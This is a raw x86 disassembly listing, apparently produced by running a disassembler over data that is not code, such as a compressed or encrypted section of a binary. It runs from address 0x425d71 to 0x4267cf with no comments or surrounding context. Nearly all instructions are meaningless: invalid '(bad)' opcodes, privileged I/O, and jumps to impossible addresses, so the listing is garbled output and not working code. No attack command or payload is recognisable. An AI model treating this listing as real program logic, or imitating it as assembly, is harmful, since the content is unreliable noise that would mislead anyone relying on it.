  425d71:	dec    ebp
  425d72:	stc    
  425d73:	rol    DWORD PTR [ebx+0x1],cl
  425d76:	mov    al,ds:0x722e0024
  425d7b:	adc    bl,cl
  425d7d:	mov    ch,0x2a
  425d7f:	push   cs
  425d80:	xchg   ecx,eax
  425d81:	pushf  
  425d82:	imul   esp,esi,0x71
  425d85:	shl    DWORD PTR [ebx],1
  425d87:	pop    ebx
  425d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d89:	inc    esp
  425d8a:	aaa    
  425d8b:	jl     0x425d2a
  425d8d:	stc    
  425d8e:	cmp    dh,BYTE PTR [esi+0x6e]
  425d91:	es inc esp
  425d93:	(bad)  
  425d95:	xor    ebp,esi
  425d97:	sbb    DWORD PTR [edx+ebp*1+0x5c],ebp
  425d9b:	mov    dl,0x88
  425d9d:	ja     0x425ddc
  425d9f:	pop    ss
  425da0:	add    al,BYTE PTR [ecx+eiz*4-0x25]
  425da4:	lods   al,BYTE PTR ds:[esi]
  425da5:	push   DWORD PTR [edi-0x39b424ef]
  425dab:	cwde   
  425dac:	call   0x166162c7
  425db1:	adc    eax,0xf53adee1
  425db6:	shl    ebp,cl
  425db8:	mov    dl,0x70
  425dba:	pop    ss
  425dbb:	int3   
  425dbc:	sti    
  425dbd:	cdq    
  425dbe:	repz add DWORD PTR es:[esp+esi*4-0xb],ecx
  425dc4:	fmul   DWORD PTR [ecx-0x156cc22]
  425dca:	mov    ebx,0xe44c007a
  425dcf:	pop    ebx
  425dd0:	int    0x54
  425dd2:	mov    ebp,0xee172a87
  425dd7:	into   
  425dd8:	mov    al,ds:0x1eb148fd
  425ddd:	jbe    0x425e3a
  425ddf:	(bad)  
  425de0:	push   0xffffffb6
  425de2:	push   esi
  425de3:	dec    ecx
  425de4:	mov    ebp,DWORD PTR [edi+0x2b356911]
  425dea:	test   BYTE PTR [edx-0x2a7d63c7],bh
  425df0:	mov    ebp,0x74e4474e
  425df5:	out    dx,eax
  425df6:	cli    
  425df7:	add    ebx,esi
  425df9:	repnz dec eax
  425dfb:	retf   0x7a4d
  425dfe:	dec    esp
  425dff:	adc    BYTE PTR [ebx],dh
  425e01:	mov    edi,0x6d271ef6
  425e06:	mov    bl,0x4e
  425e08:	xchg   edx,eax
  425e09:	pop    ss
  425e0a:	ret    
  425e0b:	xchg   ecx,eax
  425e0c:	mov    eax,ds:0xf8561737
  425e11:	and    eax,0x61603cf
  425e16:	jmp    0xaa7c99bb
  425e1b:	mov    DWORD PTR [edx-0x6d],ecx
  425e1e:	(bad)  [edi]
  425e20:	ins    BYTE PTR es:[edi],dx
  425e21:	(bad)  
  425e22:	lds    edx,FWORD PTR [esi+edi*2]
  425e25:	lock xchg esp,eax
  425e27:	shl    DWORD PTR [eax-0x56],0x13
  425e2b:	stc    
  425e2c:	xchg   edi,eax
  425e2d:	or     DWORD PTR [edx+0x74],edx
  425e30:	cmp    ebx,DWORD PTR [edi]
  425e32:	popf   
  425e33:	int    0x90
	...
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	enter  0x1dea,0x5
  425ea6:	sub    eax,0x7000194
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    bl,dh
  425eaf:	or     eax,0x898e1cec
  425eb4:	push   0x4bebd35a
  425eb9:	and    ah,BYTE PTR [esi-0x4b6ffad2]
  425ebf:	pop    es
  425ec0:	fdivr  st(5),st
  425ec2:	sbb    BYTE PTR [ecx+0x749c7b5d],0xda
  425ec9:	outs   dx,DWORD PTR ds:[esi]
  425eca:	fmul   st,st(4)
  425ecc:	cmp    bl,bl
  425ece:	xchg   edi,eax
  425ecf:	loopne 0x425ee9
  425ed1:	sbb    ebx,DWORD PTR [edx]
  425ed3:	into   
  425ed4:	sub    al,0xc4
  425ed6:	(bad)  
  425ed7:	mul    DWORD PTR [esi-0x32]
  425eda:	adc    al,0x2a
  425edc:	and    al,0xb0
  425ede:	pusha  
  425edf:	je     0x425e8a
  425ee1:	mov    esp,ebp
  425ee3:	ret    0xb0ac
  425ee6:	sbb    esp,eax
  425ee8:	(bad)  
  425ee9:	or     DWORD PTR [ebx+eax*4+0x1610c0ad],edx
  425ef0:	mov    dl,0xe
  425ef2:	call   0xd277:0x3d39cbe5
  425ef9:	and    BYTE PTR [ebp+ebx*8-0x71],dh
  425efd:	cwde   
  425efe:	pop    esi
  425eff:	bound  ebx,QWORD PTR [edi-0x436da668]
  425f05:	fsubr  st(4),st
  425f07:	pushf  
  425f08:	jb     0x425ed3
  425f0a:	cmp    dh,BYTE PTR [esi]
  425f0c:	adc    DWORD PTR [edi-0xd],edx
  425f0f:	outs   dx,BYTE PTR ds:[esi]
  425f10:	sbb    al,0x9c
  425f12:	(bad)  
  425f13:	sahf   
  425f14:	in     eax,dx
  425f15:	xchg   BYTE PTR [ebx+ebp*2],ch
  425f18:	aaa    
  425f19:	mov    ss,ecx
  425f1b:	or     esp,DWORD PTR [ebp-0x658698fb]
  425f21:	ins    BYTE PTR es:[edi],dx
  425f22:	fimul  DWORD PTR [eax+0x12c5ab96]
  425f28:	iret   
  425f29:	push   esp
  425f2a:	or     esi,edi
  425f2c:	les    edi,FWORD PTR [ebx+esi*4-0x1]
  425f30:	test   BYTE PTR ds:[eax],ah
  425f33:	push   ebp
  425f34:	sbb    BYTE PTR [edx+0x77],dh
  425f37:	jnp    0x425f37
  425f39:	test   DWORD PTR [ebx],ecx
  425f3b:	pusha  
  425f3c:	dec    ecx
  425f3d:	leave  
  425f3e:	(bad)  
  425f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f40:	mov    BYTE PTR [ecx-0x4ead0b83],bl
  425f46:	cld    
  425f47:	je     0x425f1d
  425f49:	loopne 0x425f42
  425f4b:	scas   al,BYTE PTR es:[edi]
  425f4c:	add    DWORD PTR [ebx-0x7d272f6c],edi
  425f52:	pop    esi
  425f53:	lock adc ecx,0x42
  425f57:	sub    DWORD PTR [eax],0xc65ffeee
  425f5d:	data16 sbb al,0x43
  425f60:	ins    BYTE PTR es:[edi],dx
  425f61:	jae    0x425fd4
  425f63:	push   cs
  425f64:	pop    ecx
  425f65:	call   0x175cb4b8
  425f6a:	cmp    dh,BYTE PTR [ecx-0x194c1cf9]
  425f70:	out    0xe7,al
  425f72:	pop    edx
  425f73:	mov    BYTE PTR [ecx-0x6116bd31],bl
  425f79:	cld    
  425f7a:	into   
  425f7b:	jmp    0xf85fa7d0
  425f80:	sbb    eax,0xf38df454
  425f85:	cmp    eax,0x69e9e3a6
  425f8a:	ins    DWORD PTR es:[edi],dx
  425f8b:	jo     0x425f4b
  425f8d:	push   0xc
  425f8f:	mov    ebx,0xd8e29472
  425f94:	xchg   ebp,eax
  425f95:	(bad)  
  425f96:	or     al,0x5
  425f98:	fwait
  425f99:	push   ds
  425f9a:	out    0x6a,al
  425f9c:	cwde   
  425f9d:	jbe    0x425fa4
  425f9f:	rcr    BYTE PTR [eax],1
  425fa1:	mov    eax,ds:0x7bc31dc4
  425fa6:	sub    eax,0xe0469a66
  425fab:	enter  0xc963,0x9b
  425faf:	jmp    0x7d72735
  425fb4:	mov    bl,0x0
	...
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0x770b9db7
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [edi+0x23a45cb7],al
  426033:	xor    al,0xea
  426035:	vpaddusw xmm7,xmm4,XMMWORD PTR [edx]
  426039:	repnz xchg esi,eax
  42603b:	into   
  42603c:	xchg   ecx,eax
  42603d:	(bad)  
  42603f:	and    BYTE PTR ds:0xe532c27a,ch
  426045:	cwde   
  426046:	shl    BYTE PTR [ebx-0x7cadec53],cl
  42604c:	or     al,0x29
  42604e:	xor    al,0xfd
  426050:	dec    esp
  426051:	stos   DWORD PTR es:[edi],eax
  426052:	neg    bh
  426054:	pop    esp
  426055:	xlat   BYTE PTR ds:[ebx]
  426056:	in     eax,dx
  426057:	loope  0x426090
  426059:	mov    dl,0xef
  42605b:	xor    eax,0x56740003
  426060:	inc    ebx
  426061:	outs   dx,DWORD PTR ds:[esi]
  426062:	retf   
  426063:	jmp    0xceb8:0xc7837dc3
  42606a:	cwde   
  42606b:	loopne 0x4260c6
  42606d:	adc    cl,BYTE PTR [ebx]
  42606f:	jmp    0xeded1dce
  426074:	push   edi
  426075:	pop    es
  426076:	ror    DWORD PTR [esi-0xe],1
  426079:	dec    edi
  42607a:	retf   0x4cde
  42607d:	gs aas 
  42607f:	xor    DWORD PTR [ecx-0x59e4c85d],eax
  426085:	test   BYTE PTR [ebx],0x70
  426088:	pop    esp
  426089:	fiadd  WORD PTR [ebx]
  42608b:	pop    esp
  42608c:	gs jecxz 0x42608a
  42608f:	lea    ebx,[edi+0xf41801f]
  426095:	add    DWORD PTR [ecx],ebp
  426097:	rcl    al,0x46
  42609a:	sbb    eax,edx
  42609c:	je     0x426105
  42609e:	jmp    0x426112
  4260a0:	(bad)  
  4260a1:	(bad)  
  4260a3:	push   esi
  4260a4:	int3   
  4260a5:	jnp    0x4260ae
  4260a7:	sbb    al,0x47
  4260a9:	jecxz  0x4260cd
  4260ab:	xor    edx,DWORD PTR [ecx-0x24d27cad]
  4260b1:	or     eax,0xcce4f5e2
  4260b6:	in     eax,0x8d
  4260b8:	pop    eax
  4260b9:	inc    ecx
  4260ba:	or     BYTE PTR [edi+0x15],0x3f
  4260be:	in     al,dx
  4260bf:	push   esi
  4260c0:	leave  
  4260c1:	dec    ecx
  4260c2:	jno    0x42609d
  4260c4:	xchg   al,ah
  4260c6:	xor    eax,0x8aceb77e
  4260cb:	popa   
  4260cc:	ins    BYTE PTR es:[edi],dx
  4260cd:	retf   0x194c
  4260d0:	js     0x4260c8
  4260d2:	sti    
  4260d3:	push   ebx
  4260d4:	mov    al,0x68
  4260d6:	scas   al,BYTE PTR es:[edi]
  4260d7:	in     al,dx
  4260d8:	(bad)  
  4260da:	test   al,ch
  4260dc:	adc    DWORD PTR [esi-0x47],ebp
  4260df:	ja     0x4260c5
  4260e1:	inc    esp
  4260e2:	xchg   ebx,eax
  4260e3:	adc    DWORD PTR [edi+0xd],edx
  4260e6:	bound  edi,QWORD PTR [ebx+0x2b880f6a]
  4260ec:	mov    WORD PTR [ecx-0x5d2d7f38],fs
  4260f2:	cmp    al,BYTE PTR [edi]
  4260f4:	xor    DWORD PTR [ecx-0x3db8021d],edi
  4260fa:	test   al,0x12
  4260fc:	aad    0x63
  4260fe:	sub    eax,0x6099dade
  426103:	xchg   ebp,eax
  426104:	rol    BYTE PTR [ecx-0x3a634bfd],0x6c
  42610b:	push   esp
  42610c:	jecxz  0x42615c
  42610e:	cmp    BYTE PTR ds:0x3f531bfb,al
  426114:	fdivr  QWORD PTR [edx]
  426116:	xchg   DWORD PTR [ebp+0x1f],eax
  426119:	imul   eax,DWORD PTR [eax-0x780045cc],0x690e8fa3
  426123:	fcomp  DWORD PTR [edi-0x1c]
  426126:	aaa    
  426127:	add    DWORD PTR [esi-0x5a],edx
  42612a:	sub    al,0xe2
  42612c:	pop    ss
  42612d:	jmp    0xe0277444
  426132:	adc    BYTE PTR [esi-0x7d],ah
	...
  426195:	add    BYTE PTR [ebx-0x409ef0df],bl
  42619b:	outs   dx,DWORD PTR ds:[esi]
  42619c:	(bad)  
  42619d:	sti    
  42619e:	outs   dx,DWORD PTR ds:[esi]
  42619f:	sub    BYTE PTR [ebx+0x77ee4b83],bh
  4261a5:	sar    BYTE PTR [ebx],1
  4261a7:	xchg   esi,eax
  4261a8:	add    DWORD PTR [eax],eax
  4261aa:	pop    es
  4261ab:	add    DWORD PTR [eax],eax
  4261ad:	add    dh,cl
  4261af:	cs into 
  4261b1:	mov    dl,cl
  4261b3:	pop    ebx
  4261b4:	out    0xa3,eax
  4261b6:	or     edi,edx
  4261b8:	mov    DWORD PTR [ecx+esi*1+0x45e81c40],esp
  4261bf:	iret   
  4261c0:	ins    BYTE PTR es:[edi],dx
  4261c1:	adc    al,0xa2
  4261c3:	std    
  4261c4:	inc    edi
  4261c5:	ja     0x42614c
  4261c7:	xchg   esi,eax
  4261c8:	hlt    
  4261c9:	mov    ecx,0xb32a9c92
  4261ce:	mov    ch,BYTE PTR [ebp+eax*8-0x717dc8cf]
  4261d5:	dec    ecx
  4261d6:	aaa    
  4261d7:	cs dec edi
  4261d9:	test   DWORD PTR [esi+eax*8],edx
  4261dc:	xor    eax,0x270c92ef
  4261e1:	sahf   
  4261e2:	idiv   ebx
  4261e4:	jp     0x42617c
  4261e6:	adc    eax,0x1d10c04
  4261eb:	mov    esi,0x4eb6e218
  4261f0:	push   ds
  4261f1:	sbb    al,0xed
  4261f3:	outs   dx,BYTE PTR ds:[esi]
  4261f4:	pop    esi
  4261f5:	idiv   edi
  4261f7:	or     al,BYTE PTR [edx-0x64fd1c7d]
  4261fd:	mov    al,0x5c
  4261ff:	sahf   
  426200:	cmp    ah,cl
  426202:	sbb    BYTE PTR [esi+0x52],dl
  426205:	pop    ebp
  426206:	push   ebx
  426207:	mov    edi,0x59387482
  42620c:	sar    DWORD PTR [edx],1
  42620e:	int3   
  42620f:	and    dh,BYTE PTR [ecx-0x62]
  426212:	push   edi
  426213:	push   cs
  426214:	sub    edx,edi
  426216:	push   ebx
  426217:	shl    BYTE PTR [eax-0x31],cl
  42621a:	or     BYTE PTR [edx-0x27],0xb2
  42621e:	inc    ecx
  42621f:	xchg   esi,eax
  426220:	mov    esp,0x95a33f05
  426225:	and    eax,eax
  426227:	std    
  426228:	js     0x426201
  42622a:	out    dx,al
  42622b:	sti    
  42622c:	xlat   BYTE PTR ds:[ebx]
  42622d:	hlt    
  42622e:	inc    ecx
  42622f:	fbld   TBYTE PTR [edx+0x10a38717]
  426235:	sbb    eax,0x1870be57
  42623a:	test   ebp,ebx
  42623c:	mov    dl,0x38
  42623e:	mov    ch,0xc
  426240:	push   ecx
  426241:	cdq    
  426242:	aam    0xa1
  426244:	scas   al,BYTE PTR es:[edi]
  426245:	retf   
  426246:	(bad)  
  426247:	cmp    DWORD PTR [eax-0xe35483a],edi
  42624d:	jbe    0x42627a
  42624f:	and    al,0xd3
  426251:	iret   
  426252:	xor    al,0x0
  426254:	dec    eax
  426255:	scas   eax,DWORD PTR es:[edi]
  426256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426257:	retf   0xfd08
  42625a:	dec    eax
  42625b:	xchg   ecx,eax
  42625c:	retf   0xa4dc
  42625f:	repz mov ebx,0xe28f9ed
  426265:	sbb    edi,DWORD PTR [ecx+0x2b]
  426268:	or     eax,0x263c1191
  42626d:	cs adc eax,0x15b6f69
  426273:	imul   esp,ebx,0x2f
  426276:	aam    0xba
  426278:	scas   al,BYTE PTR es:[edi]
  426279:	test   eax,0x73c6d531
  42627e:	xchg   ebp,eax
  42627f:	or     al,0xd9
  426281:	sub    eax,0x5b300d36
  426286:	popf   
  426287:	xor    DWORD PTR [edi+0x3e],esp
  42628a:	xchg   edi,eax
  42628b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42628c:	push   ds
  42628d:	cmp    BYTE PTR [eax-0x46],cl
  426290:	pop    ebx
  426291:	lahf   
  426292:	xor    edi,0x21
  426295:	loopne 0x426227
  426297:	mov    edi,0x3a44d7d1
  42629c:	push   cs
  42629d:	gs mov bl,0x1a
  4262a0:	add    cl,BYTE PTR [ebp-0x24699d1f]
  4262a6:	leave  
  4262a7:	popf   
  4262a8:	add    DWORD PTR [ebx-0x23],eax
  4262ab:	pop    ebx
  4262ac:	jno    0x4262b3
  4262ae:	les    ebx,FWORD PTR [ecx]
  4262b0:	jge    0x4262e6
  4262b2:	pop    ebx
  4262b3:	shl    cl,0x0
	...
  426316:	push   esp
  426317:	and    eax,0xeefd4e8d
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x7e54
  426323:	mul    edi
  426325:	cmp    DWORD PTR [edx-0x69],eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [edi-0x10],cl
  426330:	dec    ebx
  426331:	loopne 0x4262d0
  426333:	sbb    eax,0x9c6d0fc4
  426338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426339:	jg     0x426356
  42633b:	jmp    0x4263a3
  42633d:	jge    0x426330
  42633f:	cld    
  426340:	push   ebx
  426341:	lahf   
  426342:	adc    al,0xdc
  426344:	pushf  
  426345:	xchg   ebx,eax
  426346:	rol    DWORD PTR [edi],cl
  426348:	adc    eax,0x5a143a4d
  42634d:	mov    WORD PTR [esi-0x23],cs
  426350:	pop    edx
  426351:	ds (bad) 
  426353:	iret   
  426354:	mov    dh,0xa7
  426356:	add    DWORD PTR [ecx+0x50e8cff4],esp
  42635c:	jecxz  0x426354
  42635e:	push   edi
  42635f:	retf   0x43db
  426362:	sub    esi,ecx
  426364:	mov    al,0xf3
  426366:	pop    edi
  426367:	cmp    DWORD PTR [ebx-0x79],ebp
  42636a:	cmp    DWORD PTR [esi-0x34],esi
  42636d:	dec    esp
  42636e:	mov    ch,0xb1
  426370:	inc    edx
  426371:	xor    al,0x39
  426373:	mov    BYTE PTR [esi-0x5a],0x5d
  426377:	jo     0x426393
  426379:	xchg   ecx,eax
  42637a:	stos   BYTE PTR es:[edi],al
  42637b:	ret    0x4a0d
  42637e:	or     bl,bl
  426380:	cmp    BYTE PTR [edx],dh
  426382:	call   0x2333c29b
  426387:	push   esp
  426388:	ucomiss xmm2,DWORD PTR [ebx+0x34]
  42638c:	or     al,0xad
  42638e:	pop    esp
  42638f:	push   edi
  426390:	fldcw  WORD PTR [edi+0xc9acd98]
  426396:	(bad)  
  426397:	int    0x89
  426399:	fcom   QWORD PTR [ebp-0x17b67c36]
  42639f:	jg     0x4263bc
  4263a1:	rcl    WORD PTR [ecx-0x339aa72b],0x47
  4263a9:	mov    edi,0x4bfc833a
  4263ae:	not    BYTE PTR [eax+0x1]
  4263b1:	iret   
  4263b2:	pop    ecx
  4263b3:	fbstp  TBYTE PTR [edi+0x76]
  4263b6:	clc    
  4263b7:	xor    DWORD PTR [edi],ebx
  4263b9:	mov    dh,0xeb
  4263bb:	xor    eax,0x8b8449fe
  4263c0:	adc    DWORD PTR [ebx+0x3376f001],esp
  4263c6:	rol    DWORD PTR [ecx-0x15],1
  4263c9:	enter  0x69dc,0xee
  4263cd:	jns    0x426390
  4263cf:	jg     0x426383
  4263d1:	adc    ebp,esp
  4263d3:	xor    BYTE PTR [esi-0xd],dh
  4263d6:	jns    0x426372
  4263d8:	pop    ebx
  4263d9:	add    DWORD PTR [esi+0x3f],esi
  4263dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263dd:	push   es
  4263de:	xchg   edi,eax
  4263df:	mov    DWORD PTR [esi+0xb],esp
  4263e2:	add    DWORD PTR [ebx+0x15],ebp
  4263e5:	sub    esi,esi
  4263e7:	add    DWORD PTR es:[eax-0x77],edi
  4263eb:	mov    eax,0xcf59caef
  4263f0:	loop   0x42640a
  4263f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263f3:	lea    esp,[ebp+0xab243ad]
  4263f9:	addr16 popa 
  4263fb:	sbb    DWORD PTR [ebx],0xa1f42370
  426401:	push   edi
  426402:	cmp    ebp,0x49
  426405:	dec    edx
  426406:	sub    al,0x7c
  426408:	add    eax,0x2bf467d3
  42640d:	jno    0x4263b1
  42640f:	jb     0x426420
  426411:	lods   eax,DWORD PTR ds:[esi]
  426412:	sbb    ebx,DWORD PTR [eax+ebp*4]
  426415:	sbb    BYTE PTR [eax+0x51],bl
  426418:	(bad)  
  426419:	out    0x1f,eax
  42641b:	aaa    
  42641c:	xlat   BYTE PTR ds:[ebx]
  42641d:	pusha  
  42641e:	rcl    BYTE PTR [esi],1
  426420:	out    0x7c,al
  426422:	aas    
  426423:	test   edx,eax
  426425:	mov    eax,0x622c7fe5
  42642a:	jl     0x426415
  42642c:	push   ss
  42642d:	cmp    ecx,DWORD PTR [ecx+eax*8]
  426430:	ins    BYTE PTR es:[edi],dx
  426431:	fisub  DWORD PTR [eax+0xf]
  426434:	inc    esp
	...
  426495:	add    BYTE PTR [ecx+0x6f],ch
  426498:	mov    BYTE PTR [eax],cl
  42649a:	mov    gs,edi
  42649c:	jmp    0x7b21f210
  4264a1:	dec    esp
  4264a2:	faddp  st(2),st
  4264a4:	sbb    DWORD PTR [ebp+0x49],edx
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [ecx+0x3a],ah
  4264b0:	push   0xe67f8d16
  4264b5:	idiv   BYTE PTR [ebx]
  4264b7:	std    
  4264b8:	loope  0x42648a
  4264ba:	arpl   WORD PTR [ecx],bp
  4264bc:	mov    al,al
  4264be:	lods   al,BYTE PTR ds:[esi]
  4264bf:	xchg   bl,bl
  4264c1:	mov    ecx,0x9f0a157e
  4264c6:	aad    0x4f
  4264c8:	imul   edi,DWORD PTR [esi+0x19],0xe8b0cb72
  4264cf:	cld    
  4264d0:	inc    esp
  4264d1:	sub    al,BYTE PTR [ebx]
  4264d3:	dec    esp
  4264d4:	int    0x8f
  4264d6:	cmp    ebx,edx
  4264d8:	nop
  4264d9:	rcr    DWORD PTR [esi+0x62754e4e],1
  4264df:	or     al,0x9f
  4264e1:	and    DWORD PTR [esp+ebx*4],0x2bd49d0c
  4264e8:	ss loop 0x42653c
  4264eb:	iret   
  4264ec:	das    
  4264ed:	jbe    0x426556
  4264ef:	and    bh,BYTE PTR [ebx+0x5]
  4264f2:	push   0x4f
  4264f4:	jp     0x42647e
  4264f6:	sbb    al,0xe6
  4264f8:	mov    eax,0x2f25682a
  4264fd:	push   0xe2ff4e67
  426502:	push   0x5b3167b4
  426507:	sub    BYTE PTR [ebx+0x33872dca],al
  42650d:	sbb    DWORD PTR [esi+0x1e],ebp
  426510:	sbb    ebp,DWORD PTR [ebx+0x3ede4f60]
  426516:	int    0x91
  426518:	push   ss
  426519:	test   eax,0xf34d38dd
  42651e:	fstp   QWORD PTR [edi-0xadb1c7]
  426524:	test   edi,ebp
  426526:	jl     0x4265a2
  426528:	into   
  426529:	enter  0xeafd,0x9a
  42652d:	hlt    
  42652e:	fs addr16 and ecx,edi
  426532:	cld    
  426533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426534:	xor    DWORD PTR ds:0x469e,ebx
  426539:	pop    esp
  42653a:	mov    fs,WORD PTR [eax]
  42653c:	mov    ds:0xe3bf55c3,al
  426541:	xchg   esp,eax
  426542:	sbb    esi,DWORD PTR [edx+0x4b]
  426545:	sub    BYTE PTR [edi+0x7a],ah
  426548:	fsubr  st,st(7)
  42654a:	sub    eax,0x8809b6ca
  42654f:	add    al,0x89
  426551:	pusha  
  426552:	cmp    DWORD PTR [ecx-0x3],ebp
  426555:	aas    
  426556:	mov    bl,0x17
  426558:	and    esi,DWORD PTR [eax+0x5a714d84]
  42655e:	mov    WORD PTR [edi-0x16],?
  426561:	jns    0x42654f
  426563:	add    esi,ebx
  426565:	and    al,0x37
  426567:	addr16 aad 0x9a
  42656a:	inc    ebx
  42656b:	mov    al,0x7f
  42656d:	push   edi
  42656e:	mov    ds,WORD PTR [eax+0x8]
  426571:	xor    BYTE PTR [edi+esi*4+0x76],0xb0
  426576:	lock mov cs,WORD PTR [edi-0x48]
  42657a:	mov    eax,0x8968a278
  42657f:	int3   
  426580:	daa    
  426581:	sbb    al,0x23
  426583:	dec    esi
  426584:	(bad)
  426587:	push   edx
  426588:	cmc    
  426589:	fcmovnu st,st(2)
  42658b:	mov    BYTE PTR ds:0x61aa5e70,dl
  426591:	pop    eax
  426592:	fld    QWORD PTR [edx-0x1c]
  426595:	ja     0x42652e
  426597:	pop    ss
  426598:	xchg   cl,dl
  42659a:	add    DWORD PTR ds:0xf56d58e4,edi
  4265a0:	mov    eax,ds:0xc673ed31
  4265a5:	aad    0xb6
  4265a7:	fadd   DWORD PTR fs:[ebp-0xc2b3b5a]
  4265ae:	mov    esp,0xc3853c00
  4265b3:	xor    eax,DWORD PTR [esi]
	...
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	fcmovnb st,st(5)
  426624:	sub    al,0xec
  426626:	push   eax
  426627:	cdq    
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [eax+0x6c],dl
  426630:	sub    ch,dl
  426632:	and    BYTE PTR ds:0x77809740,cl
  426638:	mov    edi,0x7c8b4274
  42663d:	mov    bh,0xc
  42663f:	stc    
  426640:	push   ds
  426641:	sub    BYTE PTR [edx],bh
  426643:	addr16 sub al,0x18
  426646:	xor    al,0xaa
  426648:	xor    DWORD PTR [esi-0x413ab546],ebp
  42664e:	and    DWORD PTR [ecx-0x2709e970],ebx
  426654:	bswap  eax
  426656:	sbb    al,0xb7
  426658:	mov    eax,ds:0x691793c0
  42665d:	scas   al,BYTE PTR es:[edi]
  42665e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42665f:	inc    esp
  426660:	lea    esp,[esi-0x1061edd3]
  426666:	jge    0x42666e
  426668:	ror    BYTE PTR [edi],0x59
  42666b:	cld    
  42666c:	xor    cl,BYTE PTR [edi-0x981c2d4]
  426672:	jo     0x426669
  426674:	pop    eax
  426675:	lea    edx,[ebp-0x6c]
  426678:	dec    eax
  426679:	idiv   BYTE PTR [ebp+0x2c8b5d4f]
  42667f:	pop    eax
  426680:	mov    cl,0x8c
  426682:	xor    DWORD PTR [ecx+0x8],eax
  426685:	cmp    eax,0x535e571a
  42668a:	push   esi
  42668b:	mov    esi,DWORD PTR ds:0xbb80c2d6
  426691:	stc    
  426692:	jne    0x4266a2
  426694:	or     al,0xa7
  426696:	sbb    al,0xe
  426698:	push   ebx
  426699:	lea    edi,[esi-0x747880d4]
  42669f:	ins    BYTE PTR es:[edi],dx
  4266a0:	xrelease mov BYTE PTR gs:[edi-0x56a935ff],dl
  4266a8:	mov    dl,0xb6
  4266aa:	or     eax,0x2bd37224
  4266af:	ret    
  4266b0:	je     0x4266f1
  4266b2:	call   DWORD PTR [eax+edi*2+0x7ad185e7]
  4266b9:	or     ah,BYTE PTR [edi-0x32]
  4266bc:	jmp    0x42673c
  4266be:	jmp    0x7a6d381c
  4266c3:	xchg   bl,dh
  4266c5:	clc    
  4266c6:	(bad)  
  4266c7:	push   0xffffffbf
  4266c9:	and    ecx,esi
  4266cb:	lods   eax,DWORD PTR ds:[esi]
  4266cc:	mov    dh,0xa0
  4266ce:	shl    DWORD PTR [eax-0x17f7e3fc],0x4a
  4266d5:	sub    al,0x2e
  4266d7:	mov    BYTE PTR [eax-0x2d293081],ah
  4266dd:	adc    al,0x83
  4266df:	dec    ebp
  4266e0:	cmp    al,0x6b
  4266e2:	jbe    0x426686
  4266e4:	pushf  
  4266e5:	add    eax,0xf10c3f5a
  4266ea:	idiv   esi
  4266ec:	add    eax,0xeb7976be
  4266f1:	mov    ch,0x10
  4266f3:	mov    esp,0x5da7dce2
  4266f8:	call   0xce66906a
  4266fd:	xor    al,0xd6
  4266ff:	sub    dh,BYTE PTR [edx+0x4a]
  426702:	xchg   ebp,eax
  426703:	xchg   ecx,eax
  426704:	fidiv  WORD PTR [ebx]
  426706:	popf   
  426707:	in     al,0xe1
  426709:	xchg   BYTE PTR [esi+ecx*2+0x113c9ccd],bl
  426710:	sub    cl,BYTE PTR [ecx-0x57]
  426713:	sbb    al,0xf2
  426715:	mov    al,0xfe
  426717:	stos   DWORD PTR es:[edi],eax
  426718:	mov    DWORD PTR [ecx+edx*2-0x22],ebx
  42671c:	xor    dh,al
  42671e:	leave  
  42671f:	pop    ss
  426720:	scas   al,BYTE PTR es:[edi]
  426721:	rol    DWORD PTR [edi+0x1b],1
  426724:	xlat   BYTE PTR ds:[ebx]
  426725:	retf   
  426726:	pop    ebx
  426727:	mov    eax,0x3d203790
  42672c:	(bad)  
  42672d:	ins    DWORD PTR es:[edi],dx
  42672e:	jle    0x426785
  426730:	mov    ebp,0xba36dbe1
	...
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	das    
  4267a3:	jb     0x4267ca
  4267a5:	lods   al,BYTE PTR ds:[esi]
  4267a6:	push   edi
  4267a7:	call   0x0:0x1070001
  4267ae:	or     ebx,DWORD PTR es:[esi]
  4267b1:	and    edi,DWORD PTR [ebx+esi*2]
  4267b4:	xor    edx,DWORD PTR [edx+0x7a]
  4267b7:	push   eax
  4267b8:	bnd jo 0x426815
  4267bb:	mov    esp,edi
  4267bd:	cwde   
  4267be:	scas   al,BYTE PTR es:[edi]
  4267bf:	xor    ch,BYTE PTR [esi+0x2d]
  4267c2:	and    al,0x4d
  4267c4:	jg     0x4267ed
  4267c6:	mov    ch,0xcf
  4267c8:	loope  0x42680a
  4267ca:	xor    DWORD PTR [eax+ecx*4],esp
  4267cd:	adc    BYTE PTR [ecx],dl
  4267cf:	cli    
